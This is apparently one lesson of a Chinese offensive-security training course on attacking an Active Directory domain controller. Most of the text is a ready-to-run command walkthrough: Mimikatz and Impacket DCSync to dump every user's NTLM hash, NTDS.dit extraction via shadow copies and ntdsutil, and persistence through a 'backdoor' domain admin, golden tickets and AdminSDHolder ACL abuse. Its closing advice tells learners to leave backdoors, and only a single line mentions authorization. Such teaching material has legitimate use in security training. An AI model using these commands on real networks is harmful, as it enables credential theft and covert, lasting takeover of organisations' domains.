---
title: Day070：内网渗透 - 域控攻击与 DCSync
tags:
  - 网络安全
  - 渗透测试
  - 内网渗透
categories:
  - 90天安全突击
stage: 实战演练
abbrlink: fe69c
date: 2026-01-28
updated: 2026-01-28
---

# Day070：内网渗透 - 域控攻击与 DCSync

## 📋 基本信息

| 项目 | 内容 |
|------|------|
| **所属阶段** | 🏆 实战演练（第三阶段） |
| **所属周次** | Week 11-12：内网渗透基础 |
| **今日主题** | 域控攻击与 DCSync |
| **预计时间** | 3-4 小时 |
| **难度等级** | ⭐⭐⭐⭐⭐ 高级 |

---

## 🔥 今日痛点场景

> **场景**：你已经拿到了域管权限，但直接登录域控风险太大。你需要在不登录域控的情况下，获取所有域用户的密码 Hash。
>
> **问题**：如何远程「偷」走域控的整个用户数据库？
>
> **今天的任务**：使用 DCSync 技术导出所有域用户 Hash。

---

## 🎯 今日目标

- [ ] 理解 DCSync 原理
- [ ] 使用 Mimikatz 执行 DCSync
- [ ] 使用 Impacket 执行 DCSync
- [ ] 了解其他域控攻击技术

**闯关条件**：成功导出域内所有用户的 NTLM Hash。

---

## ⚔️ 实战任务（先动手！）

### 任务 1：理解 DCSync（20 分钟）

**原理**：模拟域控复制行为，请求同步账户数据。

```
攻击者（域管权限）                  域控制器
       │                              │
       │ ── 模拟 DC 复制请求 ──────→  │
       │                              │
       │ ←─── 返回用户 Hash ─────────  │
       │                              │
```

**前提**：需要以下权限之一：
- Domain Admins
- Enterprise Admins
- 具有 Replicating Directory Changes 权限

---

### 任务 2：Mimikatz DCSync（40 分钟）

**导出单个用户 Hash**：

```cmd
mimikatz # lsadump::dcsync /user:Administrator
mimikatz # lsadump::dcsync /user:krbtgt
```

**导出所有用户 Hash**：

```cmd
mimikatz # lsadump::dcsync /domain:corp.local /all /csv
```

**预期输出**：

```
[DC] 'corp.local' will be the domain
[DC] 'DC01.corp.local' will be the DC server
[DC] 'Administrator' will be the user account

SAM Username         : Administrator
Hash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0
```

---

### 任务 3：Impacket secretsdump（40 分钟）

**远程执行 DCSync**：

```bash
# 使用密码
proxychains4 impacket-secretsdump corp.local/Administrator:Password@10.0.0.1

# 使用 Hash
proxychains4 impacket-secretsdump corp.local/Administrator@10.0.0.1 -hashes :31d6cfe0d16ae931b73c59d7e0c089c0

# 只导出 NTDS
proxychains4 impacket-secretsdump -just-dc corp.local/Administrator@10.0.0.1
```

**输出格式**：

```
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404ee:xxx:::
```

---

### 任务 4：离线导出 NTDS.dit（30 分钟）

**方法 1：Volume Shadow Copy**

```cmd
:: 创建卷影副本
vssadmin create shadow /for=C:

:: 复制 NTDS.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\temp\ntds.dit

:: 复制 SYSTEM 注册表
reg save HKLM\SYSTEM C:\temp\system.hive

:: 删除卷影副本
vssadmin delete shadows /shadow={xxx} /quiet
```

**方法 2：ntdsutil**

```cmd
ntdsutil "ac i ntds" "ifm" "create full C:\temp\ntds" q q
```

**离线解析**：

```bash
impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL
```

---

### 任务 5：域内持久化（25 分钟）

**方法 1：添加域管账户**

```cmd
net user backdoor Password123 /add /domain
net group "Domain Admins" backdoor /add /domain
```

**方法 2：黄金票据**

```cmd
# 使用 krbtgt Hash 创建永久后门
kerberos::golden /user:fakeadmin /domain:corp.local /sid:S-1-5-21-xxx /krbtgt:xxx /ptt
```

**方法 3：AdminSDHolder**

```powershell
# 添加后门权限，60 分钟后自动传播到所有受保护账户
Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=corp,DC=local" -PrincipalIdentity backdooruser -Rights All
```

---

## ✅ 今日闯关检查

| 检查项 | 状态 |
|--------|------|
| 理解 DCSync 原理 | ⬜ |
| Mimikatz DCSync 成功 | ⬜ |
| secretsdump 成功 | ⬜ |
| 导出 krbtgt Hash | ⬜ |
| 理解持久化方法 | ⬜ |

---

## 📖 底层补课（做完实验再看）

### DCSync 为什么有效？

1. 域控之间需要同步数据（复制）
2. 同步协议（DRS）不验证请求者是否真的是 DC
3. 只检查请求者是否有复制权限
4. 域管默认有这个权限

### 攻击路径总结

```
初始访问 → 本地提权 → 域用户凭据 → 横向移动 → 域管权限 → DCSync → 完全控制
```

---

## ⚠️ 避坑指南

| 坑点 | 症状 | 解决方案 |
|------|------|----------|
| 权限不足 | Access Denied | 需要域管或等效权限 |
| 网络不通 | 连接超时 | 检查与 DC 的连通性 |
| 被检测 | 告警 | DCSync 会产生特征日志 |

---

## 💡 知识卡片速查

### 域控攻击方法

| 方法 | 前提 | 隐蔽性 |
|------|------|--------|
| DCSync | 域管权限 | 中 |
| NTDS.dit 复制 | 域控访问 | 低 |
| VSS 提取 | 本地管理员 | 低 |
| WMI/DCOM | 域管权限 | 中 |

### 防御建议

- 监控 DRS 复制请求
- 限制域管账户数量
- 使用特权访问工作站
- 启用高级审核

---

## 🚀 明日预告

**Day 071：内网渗透 - C2 框架入门（Cobalt Strike / Sliver）**

明天你将：
- 了解 C2 框架的作用
- 学习 Cobalt Strike 基础
- 尝试开源替代 Sliver

---

## 📊 学习记录（学习者填写）

| 项目 | 内容 |
|------|------|
| 实际学习日期 | ____年__月__日 |
| 实际用时 | ____ 小时 |
| 遇到的问题 | |
| 解决方法 | |
| 今日收获 | |
| 自评分数 | ⭐⭐⭐⭐⭐ (1-5星) |

---

> 💬 **导师点评**：
>
> DCSync 是域渗透的里程碑。成功执行意味着你已经完全控制了这个域。
>
> 拿到所有 Hash 后，别急着走。做好持久化，留好后门。
>
> 当然，在实际工作中，这些操作需要严格的授权和记录。

```bash
echo "Day 070 Complete! 域控已被攻陷！"
```
